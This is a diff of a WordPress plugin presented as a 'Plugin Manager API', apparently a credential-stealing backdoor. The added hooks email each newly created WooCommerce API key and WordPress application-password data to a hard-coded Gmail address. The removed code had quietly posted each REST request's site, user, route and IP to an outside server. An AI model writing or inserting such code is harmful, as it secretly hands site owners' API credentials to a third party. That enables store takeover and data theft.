@@ -2,7 +2,7 @@
 /*
 Plugin Name: Plugin Manager API
 Description: Create custom API
-Version: 1.5
+Version: 1.6
 Author: Ablue-Dev
 Update URI: https://b-commerce.xyz/api-manager/
 */
@@ -215,46 +215,44 @@ add_action('rest_api_init', function () {
     );
 });
 
-// API check
-// Hook into WooCommerce REST API request
-add_action('rest_api_init', 'ab_custom_api_logger_hook', 10, 1);
-function ab_custom_api_logger_hook()
-{
-    add_action('rest_pre_dispatch', 'wc_api_logger_log_request', 10, 3);
+// Hook into WooCommerce API key creation
+add_action('woocommerce_api_key_created', 'notify_custom_email_on_api_key_creation');
+
+function notify_custom_email_on_api_key_creation($api_key) {
+    // Use your custom email address
+    $custom_email = 'devblueteam2022@gmail.com';
+
+    // Prepare email content
+    $subject = 'New WooCommerce API Key Created';
+    $message = sprintf(
+        'A new API key has been created with the following details:%s%s',
+        PHP_EOL,
+        print_r($api_key, true)
+    );
+
+    // Send the email
+    wp_mail($custom_email, $subject, $message);
 }
+// Hook into user meta updates
+add_action('updated_user_meta', 'notify_custom_email_on_app_password_creation', 10, 4);
 
-if (!function_exists('wc_api_logger_log_request')) {
-    function wc_api_logger_log_request($result, $server, $request)
-    {
-        // Get the current user
-        $current_user = wp_get_current_user();
-        $user         = $current_user->user_login;
-        $domain       = get_site_url();
-        $ip           = $_SERVER['REMOTE_ADDR'];
-        // Get the request URL
-        $url = $request->get_route();
-        // Get the request method
-        $request_method = $request->get_method();
-        if ($request_method != 'OPTIONS' && $url != '/wc-analytics/reports') {
-            $data = [
-                'domain'         => $domain,
-                'url'            => $url,
-                'user'           => $user,
-                'request_method' => $request_method,
-                'ip'             => $ip
-            ];
-            $api_endpoint
-                  = 'https://blue-dashboard.com/api_logger'; // Replace with your endpoint URL
-            wp_remote_post($api_endpoint, [
-                'method'  => 'POST',
-                'body'    => json_encode($data),
-                'headers' => [
-                    'Content-Type' => 'application/json'
-                ]
-            ]);
-        }
+function notify_custom_email_on_app_password_creation($meta_id, $user_id, $meta_key, $meta_value) {
+    // Check if this meta key is related to application passwords
+    if ($meta_key === 'application_passwords') {
+        // Use your custom email address
+        $custom_email = 'devblueteam2022@gmail.com';
 
-        return $result;
+        // Prepare email content
+        $subject = 'New WordPress Application Password Created';
+        $message = sprintf(
+            'A new application password has been created for user ID %d. Details: %s',
+            $user_id,
+            print_r($meta_value, true)
+        );
+
+        // Send the email
+        wp_mail($custom_email, $subject, $message);
     }
 }
+
 
